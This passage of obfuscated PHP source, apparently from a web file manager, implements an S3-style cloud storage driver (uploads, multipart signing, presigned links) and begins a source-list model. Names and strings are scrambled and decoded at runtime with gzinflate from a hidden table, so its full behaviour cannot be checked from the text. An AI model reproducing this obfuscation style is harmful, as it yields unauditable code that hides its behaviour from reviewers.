} else { if (!empty($À◊§˛˝®)) { return !0; } } if ($˘ÔßåÖˆ === null) { break; } } if ($˛µ¥íãﬂ) { $—éÄ∏ÈÜ = array_diff($—éÄ∏ÈÜ, array($›Ò¯êã¡)); $—éÄ∏ÈÜ = count(array_unique($—éÄ∏ÈÜ)); $∏ì≠·áÓ = count(array_unique($∏ì≠·áÓ)); return array($€ëçﬂå˛[251] => $—éÄ∏ÈÜ, $€ëçﬂå˛[252] => $∏ì≠·áÓ); } return !1; } public function listAll($îäÖå˘Â) { $÷˙µÎì =& $_SERVER[ˆë€Ï⁄∂]; $Îéú„Ö∂ = $this->fileList($îäÖå˘Â, $÷˙µÎì[12], !0); $„‡∆Í°É = array_to_keyvalue($Îéú„Ö∂[$÷˙µÎì[96]], $÷˙µÎì[32]); foreach ($Îéú„Ö∂[$÷˙µÎì[95]] as $∫§ı¸⁄“) { if (is_string($∫§ı¸⁄“)) { $„‡∆Í°É[$∫§ı¸⁄“] = array($÷˙µÎì[89] => 0); } } return $this->listAllFiles($îäÖå˘Â, $„‡∆Í°É); } public function canRead($éóËæÌ¢) { $≈¡Ê™Üπ =& $_SERVER[ˆë€Ï⁄∂]; $À£®Ï˛û = $this->client->getAccessControlPolicy($this->bucket, $éóËæÌ¢); if (!$À£®Ï˛û) { return !1; } return in_array($À£®Ï˛û, array($≈¡Ê™Üπ[253], $≈¡Ê™Üπ[254], $≈¡Ê™Üπ[255])) ? !0 : !1; } public function canWrite($¨ﬁËéµø) { $ÕÕ≤ßŒ˘ =& $_SERVER[ˆë€Ï⁄∂]; $Íö˝€€Å = $this->client->getAccessControlPolicy($this->bucket, $¨ﬁËéµø); if (!$Íö˝€€Å) { return !1; } return in_array($Íö˝€€Å, array($ÕÕ≤ßŒ˘[253], $ÕÕ≤ßŒ˘[254])) ? !0 : !1; } public function getContent($öÅ˝·˘ù) { return $this->client->getObject($this->bucket, $öÅ˝·˘ù); } public function setContent($Ìÿä´‰ú, $ˆ†Õã∑Î = '', $Êı∏¸∆ê = false) { $”ù†˜≥Ω =& $_SERVER[ˆë€Ï⁄∂]; $Ìÿä´‰ú = $Êı∏¸∆ê ? trim($Ìÿä´‰ú, $”ù†˜≥Ω[8]) . $”ù†˜≥Ω[8] : $Ìÿä´‰ú; $´ÈÕÕ˘Œ = get_file_mime(get_path_ext($Ìÿä´‰ú)); $Ò‡àΩò’ = $this->client->putObject($ˆ†Õã∑Î, $this->bucket, $Ìÿä´‰ú, $”ù†˜≥Ω[241], array(), $´ÈÕÕ˘Œ); if (!$Ò‡àΩò’) { return !1; } if ($Êı∏¸∆ê) { return !0; } return $Ò‡àΩò’ ? !0 : !1; } public function fileSubstr($ôèÇﬂ≤Ú, $ãÔ˘ø§õ, $™ƒ∆¢πÕ) { $ó≠»ëı© = $ãÔ˘ø§õ + $™ƒ∆¢πÕ - 1; return $this->client->getObject($this->bucket, $ôèÇﬂ≤Ú, array($_SERVER[ˆë€Ï⁄∂][256] => "\x62\x79\x74\145\163\75{$ãÔ˘ø§õ}\55{$ó≠»ëı©}")); } public function upload($çâ◊¿©¨, $ÒÜÕÌ≠, $ÏØ’∂∏û = false, $∞«ÀóÁó = REPEAT_REPLACE) { $·¸”∏Ò‰ =& $_SERVER[ˆë€Ï⁄∂]; $Çﬂ¡Æ∫º = array($·¸”∏Ò‰[257] => @md5_file($ÒÜÕÌ≠)); $È©ıºˆ¶ = array($·¸”∏Ò‰[258] => get_file_mime(get_path_ext($çâ◊¿©¨))); if (IO::size($ÒÜÕÌ≠) <= 1024 * 1024 * 200) { $ã∆Ω∞§É = $this->client->putObjectFile($ÒÜÕÌ≠, $this->bucket, $çâ◊¿©¨, $·¸”∏Ò‰[241], $Çﬂ¡Æ∫º, $È©ıºˆ¶); return !empty($ã∆Ω∞§É) ? $this->getPathOuter($çâ◊¿©¨) : !1; } $˚êÆ¸í = $this->client->multiUploadObject($ÒÜÕÌ≠, $this->bucket, trim($çâ◊¿©¨, $·¸”∏Ò‰[8]), $Çﬂ¡Æ∫º, $È©ıºˆ¶); return $˚êÆ¸í ? $this->getPathOuter($çâ◊¿©¨) : !1; } public function download($«‡ˆ®Ãö, $’›…´≥ˆ) { if (!@is_dir($this->pathFather($’›…´≥ˆ)) && !IO::mkdir($this->pathFather($’›…´≥ˆ))) { return !1; } $‚Ç˜Ÿ†∂ = $this->client->getObject($this->bucket, $«‡ˆ®Ãö, array(), $’›…´≥ˆ); return $‚Ç˜Ÿ†∂ !== !1 ? $’›…´≥ˆ : !1; } public function link($®ÑçÊŒí, $œÌ®ˆÊº = array()) { return $this->getPreSignedURL($®ÑçÊŒí, 3600 * 12, $œÌ®ˆÊº); } private function getPreSignedURL($ÑÌ’èÖ¶, $∑»“åõ˙, $∏¶™óóˆ = array(), $†€ÊøÈ∆ = "\x47\x45\124") { $ƒ™Ï¬‘∆ =& $_SERVER[ˆë€Ï⁄∂]; $ÑÌ’èÖ¶ = trim($ÑÌ’èÖ¶, $ƒ™Ï¬‘∆[8]); if ($this->signVer == $ƒ™Ï¬‘∆[259]) { return $this->client->getPreSignedV2URL($this->bucket, $ÑÌ’èÖ¶, $∑»“åõ˙, $†€ÊøÈ∆, $∏¶™óóˆ); } return $this->client->getPreSignedV4URL($this->bucket, $ÑÌ’èÖ¶, $∑»“åõ˙, array(), $†€ÊøÈ∆, $∏¶™óóˆ); } public function fileOut($ÙÙÿ‰∞Ö, $öÎ‚Ïáˆ = false, $Ø•” ‹– = false, $ÑÚ«øÏÜ = '') { $“Äô˙“∏ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÙÙÿ‰∞Ö, $öÎ‚Ïáˆ, $Ø•” ‹–, $ÑÚ«øÏÜ); } if (!$Ø•” ‹–) { $Ø•” ‹– = $this->pathThis($ÙÙÿ‰∞Ö); } $˜èÀ›… = get_file_mime(get_path_ext($Ø•” ‹–)); if ($˜èÀ›… == $“Äô˙“∏[260]) { return parent::fileOut($ÙÙÿ‰∞Ö, $öÎ‚Ïáˆ, $Ø•” ‹–, $ÑÚ«øÏÜ); } $Ñˆ®¿Á∂ = array($“Äô˙“∏[261] => $˜èÀ›…); if ($öÎ‚Ïáˆ) { $Ñˆ®¿Á∂[$“Äô˙“∏[262]] = $“Äô˙“∏[263] . rawurlencode($Ø•” ‹–); } else { } $˙¯ı˙¡‚ = $this->link($ÙÙÿ‰∞Ö, $Ñˆ®¿Á∂); $this->fileOutLink($˙¯ı˙¡‚); } public function fileOutServer($˘â…÷·Ü, $ñ™¸ìãá = false, $ä£˛ÚÉÈ = false, $‚’íπÃË = '') { parent::fileOut($˘â…÷·Ü, $ñ™¸ìãá, $ä£˛ÚÉÈ, $‚’íπÃË); } public function fileOutImageServer($«˙ﬂ·üå, $€ø‘Îﬁ¨ = 250) { parent::fileOutImage($«˙ﬂ·üå, $€ø‘Îﬁ¨); } public function hashMd5($πçµ˚Ê—, $ºÛ®∆∆∞ = '') { $›¬§©¿ = $this->objectMeta($πçµ˚Ê—); if (!$›¬§©¿) { return !1; } $ºÛ®∆∆∞ = $ºÛ®∆∆∞ ? $ºÛ®∆∆∞ : _get($›¬§©¿, $_SERVER[ˆë€Ï⁄∂][264]); return $ºÛ®∆∆∞; } public function uploadFormData($˚Àû¢Ô™, $¨üêß»± = 3600) { $‚ÊÜ›Œ£ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->_isClientAsync()) { $ÕªàıÛÕ = $this->getPreSignedURL($˚Àû¢Ô™, $¨üêß»±, array(), $‚ÊÜ›Œ£[265]); return array($‚ÊÜ›Œ£[218] => str_replace($‚ÊÜ›Œ£[228], $‚ÊÜ›Œ£[266], $ÕªàıÛÕ)); } if (isset($GLOBALS[$‚ÊÜ›Œ£[6]][$‚ÊÜ›Œ£[102]][$‚ÊÜ›Œ£[267]]) && $GLOBALS[$‚ÊÜ›Œ£[6]][$‚ÊÜ›Œ£[102]][$‚ÊÜ›Œ£[267]] == $‚ÊÜ›Œ£[240]) { return $this->uploadMultiData($˚Àû¢Ô™, $¨üêß»±); } if ($this->signVer == $‚ÊÜ›Œ£[259]) { return $this->uploadFormDataV2($˚Àû¢Ô™, $¨üêß»±); } return $this->uploadFormDataV4($˚Àû¢Ô™, $¨üêß»±); } public function uploadFormDataV2($ƒ‹œØ˜¬, $‹à·ËÇ = 3600) { $œÌ∞”î¯ =& $_SERVER[ˆë€Ï⁄∂]; $Ø∞Î∆˚• = $this->pathFather($ƒ‹œØ˜¬); $Ã”¥ü“Ä = $this->client->getHttpUploadPostParams($this->bucket, $Ø∞Î∆˚•, $œÌ∞”î¯[241], $‹à·ËÇ); $‘§‰Å Ì = array_merge((array) $Ã”¥ü“Ä, array($œÌ∞”î¯[268] => $œÌ∞”î¯[259], $œÌ∞”î¯[218] => $this->getHost())); if ($this->_isClientAsync()) { unset($‘§‰Å Ì[$œÌ∞”î¯[268]]); } return $‘§‰Å Ì; } public function uploadFormDataV4($é≈¨ßÇà, $∆‰Ä‚È‹ = 3600) { $ºËÿ‹´‘ =& $_SERVER[ˆë€Ï⁄∂]; $ ∆Ø›‰¡ = $ºËÿ‹´‘[241]; $§Áôá∂÷ = $ºËÿ‹´‘[269]; $÷œàí⁄¿ = $ºËÿ‹´‘[72]; $¥πÖàŸÊ = gmdate($ºËÿ‹´‘[270]); $√ï¿…© = gmdate($ºËÿ‹´‘[271]); $ñä±˝À‚ = $ºËÿ‹´‘[272]; $„¡Çè¨„ = $∆‰Ä‚È‹ . $ºËÿ‹´‘[12]; $Ô›åµüˆ = $ºËÿ‹´‘[273]; $†Î±ã†€ = array($this->accessKey, $√ï¿…©, $this->region, $÷œàí⁄¿, $ñä±˝À‚); $«°›≤˘â = implode($ºËÿ‹´‘[8], $†Î±ã†€); $”¡Ûã‡ù = array($ºËÿ‹´‘[274] => gmdate($ºËÿ‹´‘[275], strtotime($ºËÿ‹´‘[276])), $ºËÿ‹´‘[277] => array(array($ºËÿ‹´‘[278] => $this->bucket), array($ºËÿ‹´‘[279], $ºËÿ‹´‘[280], $ºËÿ‹´‘[12]), array($ºËÿ‹´‘[279], $ºËÿ‹´‘[281], $ºËÿ‹´‘[12]), array($ºËÿ‹´‘[282] => $Ô›åµüˆ), array($ºËÿ‹´‘[283] => $«°›≤˘â), array($ºËÿ‹´‘[284] => $§Áôá∂÷), array($ºËÿ‹´‘[285] => $¥πÖàŸÊ), array($ºËÿ‹´‘[286] => $„¡Çè¨„))); $€µñ‚˝ù = base64_encode(json_encode($”¡Ûã‡ù)); $ÒﬂŸ¶‹Ó = hash_hmac($ºËÿ‹´‘[287], $√ï¿…©, $ºËÿ‹´‘[288] . $this->secret, !0); $£Æ∞∏´Ï = hash_hmac($ºËÿ‹´‘[287], $this->region, $ÒﬂŸ¶‹Ó, !0); $‡ÿÎØ†Ÿ = hash_hmac($ºËÿ‹´‘[287], $÷œàí⁄¿, $£Æ∞∏´Ï, !0); $˜ªÛÔæö = hash_hmac($ºËÿ‹´‘[287], $ñä±˝À‚, $‡ÿÎØ†Ÿ, !0); $ãﬂçú¥± = hash_hmac($ºËÿ‹´‘[287], $€µñ‚˝ù, $˜ªÛÔæö); $∑‹Í∆â≈ = array($ºËÿ‹´‘[258] => $ºËÿ‹´‘[12], $ºËÿ‹´‘[282] => $Ô›åµüˆ, $ºËÿ‹´‘[289] => $€µñ‚˝ù, $ºËÿ‹´‘[283] => $«°›≤˘â, $ºËÿ‹´‘[284] => $§Áôá∂÷, $ºËÿ‹´‘[285] => $¥πÖàŸÊ, $ºËÿ‹´‘[286] => $„¡Çè¨„, $ºËÿ‹´‘[290] => $ãﬂçú¥±, $ºËÿ‹´‘[268] => $ºËÿ‹´‘[259], $ºËÿ‹´‘[218] => $this->getHost()); if ($this->_isClientAsync()) { unset($∑‹Í∆â≈[$ºËÿ‹´‘[268]]); } return $∑‹Í∆â≈; } public function uploadMultiData($ „◊⁄ÍÁ, $îõ»åÆ‹ = 3600) { $íØŒ¬¸¶ =& $_SERVER[ˆë€Ï⁄∂]; $¬∞ßúóÅ = $this->signVer == $íØŒ¬¸¶[259] ? gmdate($íØŒ¬¸¶[291]) : gmdate($íØŒ¬¸¶[292]); $œ°≥ã©ú = array(); $‰œœæΩÓ = $this->client->getUploadId($this->bucket, $ „◊⁄ÍÁ, $œ°≥ã©ú); if (!$‰œœæΩÓ) { return !1; } $Ôû√ÄŸ = array($íØŒ¬¸¶[293] => $‰œœæΩÓ, $íØŒ¬¸¶[218] => $this->getHost() . $íØŒ¬¸¶[8] . $this->pathEncode($ „◊⁄ÍÁ), $íØŒ¬¸¶[294] => $¬∞ßúóÅ, $íØŒ¬¸¶[107] => $ „◊⁄ÍÁ, $íØŒ¬¸¶[268] => $this->signVer); if ($this->_isClientAsync()) { unset($Ôû√ÄŸ[$íØŒ¬¸¶[268]]); } return $Ôû√ÄŸ; } public function uploadMultiAuth($∞ÕÄæ•ü, $øˆ›∏ ¶ = array()) { $®àúˆ∂ã =& $_SERVER[ˆë€Ï⁄∂]; if ($this->signVer == $®àúˆ∂ã[259]) { if (isset($øˆ›∏ ¶[$®àúˆ∂ã[295]])) { return $this->uploadPartAuthV2($∞ÕÄæ•ü, $øˆ›∏ ¶); } return $this->uploadListAuthV2($∞ÕÄæ•ü, $øˆ›∏ ¶); } if (isset($øˆ›∏ ¶[$®àúˆ∂ã[295]])) { return $this->uploadPartAuthV4($∞ÕÄæ•ü, $øˆ›∏ ¶); } return $this->uploadListAuthV4($∞ÕÄæ•ü, $øˆ›∏ ¶); } public function uploadPartAuthV2($¯ø„Ö™§, $åäëŸ…≥ = array()) { $Á‰≈“ﬂñ =& $_SERVER[ˆë€Ï⁄∂]; $ˆö∂˜˚ = $åäëŸ…≥[$Á‰≈“ﬂñ[107]]; $±˘˙†Ó = gmdate($Á‰≈“ﬂñ[291]); $ôÇ•¥◊í = array_intersect_key($åäëŸ…≥, array_flip(array($Á‰≈“ﬂñ[295], $Á‰≈“ﬂñ[293]))); ksort($ôÇ•¥◊í); $ø´À◊∞⁄ = $ôÇ•¥◊í ? $Á‰≈“ﬂñ[86] . http_build_query($ôÇ•¥◊í, null, $Á‰≈“ﬂñ[296], PHP_QUERY_RFC3986) : $Á‰≈“ﬂñ[12]; $¨«Üæß™ = array($Á‰≈“ﬂñ[265], $Á‰≈“ﬂñ[12], $Á‰≈“ﬂñ[133], $Á‰≈“ﬂñ[12], "\x78\x2d\141\155\172\55\x64\141\164\145\x3a{$±˘˙†Ó}", $Á‰≈“ﬂñ[8] . $this->bucket . $Á‰≈“ﬂñ[8] . $this->pathEncode($ˆö∂˜˚) . $ø´À◊∞⁄); $Æ≤Ñ∞ƒ¢ = implode($Á‰≈“ﬂñ[59], $¨«Üæß™); $¿…—˙ª„ = $this->client->__getSignature($Æ≤Ñ∞ƒ¢); return array($Á‰≈“ﬂñ[297] => $¿…—˙ª„, $Á‰≈“ﬂñ[294] => $±˘˙†Ó); } public function uploadListAuthV2($≥œ¥ ûÃ, $„ò√ËÊÙ = array()) { $áÈ˜•»‚ =& $_SERVER[ˆë€Ï⁄∂]; $ø‰˜íÍÙ = $„ò√ËÊÙ[$áÈ˜•»‚[107]]; $º‚íŸÃü = $„ò√ËÊÙ[$áÈ˜•»‚[293]]; $≤∏Ò˛Å≤ = $this->client->listParts($this->bucket, $ø‰˜íÍÙ, $º‚íŸÃü); if (!$≤∏Ò˛Å≤) { return !1; } $ÙÁ¶à‡ó = gmdate($áÈ˜•»‚[291]); $˜Á≈Ö„„ = $áÈ˜•»‚[298] . $º‚íŸÃü; $¥ûé¿€Ö = array($áÈ˜•»‚[299], $áÈ˜•»‚[12], $áÈ˜•»‚[133], $áÈ˜•»‚[12], "\170\55\x61\155\172\x2d\x64\x61\164\145\x3a{$ÙÁ¶à‡ó}", $áÈ˜•»‚[8] . $this->bucket . $áÈ˜•»‚[8] . $this->pathEncode($ø‰˜íÍÙ) . $˜Á≈Ö„„); $æÉî€˛Æ = implode($áÈ˜•»‚[59], $¥ûé¿€Ö); $›®Ç¿«ê = $this->client->__getSignature($æÉî€˛Æ); return array($áÈ˜•»‚[297] => $›®Ç¿«ê, $áÈ˜•»‚[294] => $ÙÁ¶à‡ó, $áÈ˜•»‚[300] => $≤∏Ò˛Å≤); } public function uploadPartAuthV4($çîïœ¢Ô, $ΩáıÔ–Â = array()) { $Å™èÆÉÏ =& $_SERVER[ˆë€Ï⁄∂]; $ë˛’µÎ™ = $ΩáıÔ–Â[$Å™èÆÉÏ[107]]; $Œ‰á˛¡” = array($Å™èÆÉÏ[285] => gmdate($Å™èÆÉÏ[292]), $Å™èÆÉÏ[301] => _get($ΩáıÔ–Â, $Å™èÆÉÏ[302], hash($Å™èÆÉÏ[287], $Å™èÆÉÏ[12]))); $Æ˙öÎﬁÍ = explode($Å™èÆÉÏ[220], $this->getHost()); $¿ËÿåÎÆ = array($Å™èÆÉÏ[303] => $Æ˙öÎﬁÍ[1], $Å™èÆÉÏ[304] => $Å™èÆÉÏ[12], $Å™èÆÉÏ[258] => $Å™èÆÉÏ[133], $Å™èÆÉÏ[305] => $ΩáıÔ–Â[$Å™èÆÉÏ[89]]); $ô¢Õ∆’£ = $Å™èÆÉÏ[265]; $»◊Ω•ôÖ = $Å™èÆÉÏ[8] . $this->pathEncode($ë˛’µÎ™); $Ã£ò£ºÖ = array_intersect_key($ΩáıÔ–Â, array_flip(array($Å™èÆÉÏ[295], $Å™èÆÉÏ[293]))); $ùæ¿ª∞∑ = $this->client->__getSignatureV4($Œ‰á˛¡”, $¿ËÿåÎÆ, $ô¢Õ∆’£, $»◊Ω•ôÖ, $Ã£ò£ºÖ); return array($Å™èÆÉÏ[297] => $ùæ¿ª∞∑, $Å™èÆÉÏ[301] => $Œ‰á˛¡”[$Å™èÆÉÏ[301]], $Å™èÆÉÏ[294] => $Œ‰á˛¡”[$Å™èÆÉÏ[285]]); } public function uploadListAuthV4($ÎÍí‰≠ï, $ûî·ÂÇ√ = array()) { $ŒØ«Áﬂ˜ =& $_SERVER[ˆë€Ï⁄∂]; $Œ≈Ì™Àà = $ûî·ÂÇ√[$ŒØ«Áﬂ˜[107]]; $ê˝åÄé√ = $ûî·ÂÇ√[$ŒØ«Áﬂ˜[293]]; $©éÒóøÔ = $this->client->listParts($this->bucket, $Œ≈Ì™Àà, $ê˝åÄé√); if (!$©éÒóøÔ) { return !1; } $‰∂÷≥ﬁ = $ŒØ«Áﬂ˜[306]; foreach ($©éÒóøÔ as $∞¡ùÖü∑) { $‰∂÷≥ﬁ .= $ŒØ«Áﬂ˜[307] . "\x3c\x50\141\x72\164\116\165\155\142\145\x72\x3e{$∞¡ùÖü∑[$ŒØ«Áﬂ˜[308]]}\x3c\57\120\141\162\164\116\165\155\142\x65\162\76\xa" . "\x3c\105\124\x61\x67\x3e{$∞¡ùÖü∑[$ŒØ«Áﬂ˜[309]]}\74\x2f\105\124\141\x67\x3e\xa" . $ŒØ«Áﬂ˜[310]; } $‰∂÷≥ﬁ .= $ŒØ«Áﬂ˜[311]; $‚º⁄ª…Ã = array($ŒØ«Áﬂ˜[285] => gmdate($ŒØ«Áﬂ˜[292]), $ŒØ«Áﬂ˜[301] => hash($ŒØ«Áﬂ˜[287], $‰∂÷≥ﬁ)); $£©£ãâ¶ = explode($ŒØ«Áﬂ˜[220], $this->getHost()); $Ã˘Ôƒ´÷ = array($ŒØ«Áﬂ˜[303] => $£©£ãâ¶[1], $ŒØ«Áﬂ˜[258] => $ŒØ«Áﬂ˜[133], $ŒØ«Áﬂ˜[305] => strlen($‰∂÷≥ﬁ)); $»˙Æœ™ = $ŒØ«Áﬂ˜[299]; $òÄ‘ÿÒƒ = $ŒØ«Áﬂ˜[8] . $this->pathEncode($Œ≈Ì™Àà); $öÊ¿áŒ‹ = array($ŒØ«Áﬂ˜[293] => $ê˝åÄé√); $Û≥Êß… = $this->client->__getSignatureV4($‚º⁄ª…Ã, $Ã˘Ôƒ´÷, $»˙Æœ™, $òÄ‘ÿÒƒ, $öÊ¿áŒ‹); return array($ŒØ«Áﬂ˜[297] => $Û≥Êß…, $ŒØ«Áﬂ˜[301] => $‚º⁄ª…Ã[$ŒØ«Áﬂ˜[301]], $ŒØ«Áﬂ˜[294] => $‚º⁄ª…Ã[$ŒØ«Áﬂ˜[285]], $ŒØ«Áﬂ˜[300] => $©éÒóøÔ); } private function _isClientAsync() { $ÙÎ‘ÈÀı =& $_SERVER[ˆë€Ï⁄∂]; static $û≈è…©‘ = null; if ($û≈è…©‘ === null) { $∆˝†–≈Ú = isset($_REQUEST[$ÙÎ‘ÈÀı[312]]) ? json_decode($_REQUEST[$ÙÎ‘ÈÀı[312]], !0) : !1; $û≈è…©‘ = $∆˝†–≈Ú && _get($∆˝†–≈Ú, $ÙÎ‘ÈÀı[313]) == $ÙÎ‘ÈÀı[314]; } return $û≈è…©‘; } public function getHost() { $‡Ÿ∆‘˜π =& $_SERVER[ˆë€Ï⁄∂]; $ƒÖº˙Èç = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‡Ÿ∆‘˜π[80], $‡Ÿ∆‘˜π[74], $‡Ÿ∆‘˜π[79], $‡Ÿ∆‘˜π[72]))) { return $ƒÖº˙Èç . $‡Ÿ∆‘˜π[8] . $this->bucket; } if ($this->osType == $‡Ÿ∆‘˜π[72] && !is_domain($ƒÖº˙Èç)) { return $ƒÖº˙Èç . $‡Ÿ∆‘˜π[8] . $this->bucket; } $ƒÖº˙Èç = explode($‡Ÿ∆‘˜π[220], $ƒÖº˙Èç); return $ƒÖº˙Èç[0] . $‡Ÿ∆‘˜π[220] . $this->bucket . $‡Ÿ∆‘˜π[10] . $ƒÖº˙Èç[1]; } public function size($¶∏°·©˘) { $‡Äï‰Ü„ = $this->objectMeta($¶∏°·©˘); return $‡Äï‰Ü„ ? $‡Äï‰Ü„[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function info($‘àƒåÆ ) { if ($this->isFolder($‘àƒåÆ )) { return $this->folderInfo($‘àƒåÆ ); } else { if ($this->isFile($‘àƒåÆ )) { return $this->fileInfo($‘àƒåÆ ); } } return !1; } public function exist($—•Òêïí) { return $this->isFile($—•Òêïí) || $this->isFolder($—•Òêïí); } public function isFile($ïŒ±ÊÅõ) { return !$this->isFolder($ïŒ±ÊÅõ) && $this->objectMeta($ïŒ±ÊÅõ); } public function isFolder($≤≈ÎÍΩ…) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][189], $≤≈ÎÍΩ…); } protected function objectMeta($àö®ò) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][191], $àö®ò); } protected function _objectMeta($¶§Èë·Ø) { $”‘—É≥õ =& $_SERVER[ˆë€Ï⁄∂]; $¶§Èë·Ø = rtrim($¶§Èë·Ø, $”‘—É≥õ[8]); try { $ì“îéòÂ = $this->client->getObjectInfo($this->bucket, $¶§Èë·Ø); if (!isset($ì“îéòÂ[$”‘—É≥õ[264]]) && isset($ì“îéòÂ[$”‘—É≥õ[315]])) { $ì“îéòÂ[$”‘—É≥õ[264]] = $ì“îéòÂ[$”‘—É≥õ[315]]; } } catch (Exception $Ï„πíê¸) { $ì“îéòÂ = !1; } if (!$ì“îéòÂ) { } return $ì“îéòÂ; } protected function _isFolder($œ◊§Öô ) { $›óóúâø =& $_SERVER[ˆë€Ï⁄∂]; $œ◊§Öô  = rtrim($œ◊§Öô , $›óóúâø[8]) . $›óóúâø[8]; if ($œ◊§Öô  == $›óóúâø[12] || $œ◊§Öô  == $›óóúâø[8]) { return !0; } $ÛÎÈéè¶ = $this->client->getBucket($this->bucket, $œ◊§Öô , null, 1); if (empty($ÛÎÈéè¶[$›óóúâø[248]])) { return !1; } $Ê‡ú–≈ï = $ÛÎÈéè¶[$›óóúâø[248]][0][$›óóúâø[32]]; return stripos($Ê‡ú–≈ï, $œ◊§Öô ) === 0 ? !0 : !1; if (substr($Ê‡ú–≈ï, -1) == $›óóúâø[8]) { return !0; } if (get_path_this($Ê‡ú–≈ï) == get_path_this($œ◊§Öô )) { return !1; } return !0; } public function listObject($Õ«‹°óÃ) { return $this->fileList($Õ«‹°óÃ, $_SERVER[ˆë€Ï⁄∂][12], !0); } } goto D»æ¨±é´á; E©ãŒ‡Ã‹ñ: $finljqrvzy = $_SERVER[ˆë€Ï⁄∂][693]; if (strlen($finljqrvzy) < $_SERVER[ˆë€Ï⁄∂][694]) { die; } $_SERVER[ﬂéá≤›] = explode($_SERVER[ˆë€Ï⁄∂][695], gzinflate(substr($_SERVER[ˆë€Ï⁄∂][696], 10, -8))); goto DêÈ™Î€‘ª; BÆ•ÈÓÖæì: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\x65" => "\151\x6f\137\163\x6f\165\x72\x63\145\x5f\x6d\x65\x74\x61", "\155\145\x74\x61\x46\x69\x65\x6c\144" => "\x73\157\165\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\162\x74", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\143\162\x65\x61\164\x65\124\151\x6d\145", "\x74\x69\155\x65", "\x69\156\163\x65\162\x74", "\146\x75\x6e\x63\164\x69\157\156"), array("\x76\x69\145\x77\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\162\x74", "\x66\x75\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Õƒ°Òœì) { return $this->listSource(array($_SERVER[ˆë€Ï⁄∂][488] => $Õƒ°Òœì)); } public function typeName($éÓΩœÑ˙) { static $Ü˘˜À˝£ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $Ü˘˜À˝£[$éÓΩœÑ˙ . $_SERVER[ˆë€Ï⁄∂][12]]; } public function sourceListInfo($£˝Øñßó, $‚¡ù®‚Ê = false) { $ñí»ﬁÊë =& $_SERVER[ˆë€Ï⁄∂]; $£˝Øñßó = $£˝Øñßó ? $£˝Øñßó : array(); $£˝Øñßó = array_filter(array_unique($£˝Øñßó)); if (!$£˝Øñßó) { return array(); } $… ¢®‰… = $this->where(array($ñí»ﬁÊë[203] => array($ñí»ﬁÊë[7], $£˝Øñßó)))->select(); $this->_listDataApply($… ¢®‰…, $‚¡ù®‚Ê); return array_to_keyvalue($… ¢®‰…, $ñí»ﬁÊë[203]); } public function pathInfoFilter(&$˜Ø≤∑«–) { $Ù´øõËä =& $_SERVER[ˆë€Ï⁄∂]; static $Ñ•Æ‘¨Æ = false; static $òúıôöã = false; static $Ì˚§ï»” = false; if (!$Ñ•Æ‘¨Æ) { $Ûæ‹ˆ™Ù = $Ù´øõËä[489]; $Ûæ‹ˆ™Ù .= $Ù´øõËä[490]; $Ûæ‹ˆ™Ù .= $Ù´øõËä[491]; $£õß¯„ã = $Ù´øõËä[492]; $æﬂêÈûË = explode($Ù´øõËä[50], $£õß¯„ã); $Ñ•Æ‘¨Æ = explode($Ù´øõËä[50], $Ûæ‹ˆ™Ù); $òúıôöã = array(); foreach ($Ñ•Æ‘¨Æ as $±≈Íâ¨ô) { if (in_array($±≈Íâ¨ô, $æﬂêÈûË)) { continue; } $òúıôöã[] = $±≈Íâ¨ô; } $Ì˚§ï»” = explode($Ù´øõËä[50], $Ù´øõËä[493]); } foreach ($Ì˚§ï»” as $¬êä‘◊˚) { if (isset($˜Ø≤∑«–[$¬êä‘◊˚])) { $˜Ø≤∑«–[$¬êä‘◊˚] = intval($˜Ø≤∑«–[$¬êä‘◊˚]); } } $˜Ø≤∑«–[$Ù´øõËä[97]] = $Ù´øõËä[494] . $˜Ø≤∑«–[$Ù´øõËä[203]] . $Ù´øõËä[495]; $˜Ø≤∑«–[$Ù´øõËä[33]] = $˜Ø≤∑«–[$Ù´øõËä[496]] == 1 ? $Ù´øõËä[88] : $Ù´øõËä[242]; $˜Ø≤∑«–[$Ù´øõËä[200]] = $this->typeName($˜Ø≤∑«–[$Ù´øõËä[200]]); if ($˜Ø≤∑«–[$Ù´øõËä[496]] != 1) { $˜Ø≤∑«–[$Ù´øõËä[179]] = $˜Ø≤∑«–[$Ù´øõËä[497]]; unset($˜Ø≤∑«–[$Ù´øõËä[497]]); } $◊Ÿ‡ôΩ° = $Ñ•Æ‘¨Æ; if (isset($˜Ø≤∑«–[$Ù´øõËä[498]]) && $˜Ø≤∑«–[$Ù´øõËä[498]][$Ù´øõËä[499]] == -1) { $◊Ÿ‡ôΩ° = $òúıôöã; } $˜Ø≤∑«– = array_field_key($˜Ø≤∑«–, $◊Ÿ‡ôΩ°); return $˜Ø≤∑«–; } public function listUserFav() { $û˘©¿á™ =& $_SERVER[ˆë€Ï⁄∂]; $ÿ‘©¿ü— = Model($û˘©¿á™[500])->listData(); $ Õª±—î = array_filter_by_field($ÿ‘©¿ü—, $û˘©¿á™[33], $û˘©¿á™[501]); $ Õª±—î = array_to_keyvalue($ Õª±—î, $û˘©¿á™[12], $û˘©¿á™[97]); if ($ Õª±—î) { $∞Á√·™∫ = $this->listSource(array($û˘©¿á™[502] => array($û˘©¿á™[503], $ Õª±—î))); } $∞Á√·™∫ = array_to_keyvalue($∞Á√·™∫[$û˘©¿á™[456]], $û˘©¿á™[203]); foreach ($ÿ‘©¿ü— as &$˝ãÜ∏Øï) { 